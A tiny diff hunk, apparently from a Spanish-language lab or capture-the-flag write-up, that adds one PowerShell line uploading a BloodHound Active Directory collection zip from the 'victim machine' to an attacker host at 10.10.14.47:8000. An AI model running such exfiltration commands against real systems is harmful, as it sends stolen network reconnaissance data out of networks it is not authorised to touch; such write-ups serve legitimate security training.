@@ -176,7 +176,7 @@ subimos el `SharpHound.exe` a la maquina victima
 
 
 
-
+Invoke-FileUpload -Uri http://10.10.14.47:8000/upload -File "20240622221434_BloodHound.zip"
 
 
 
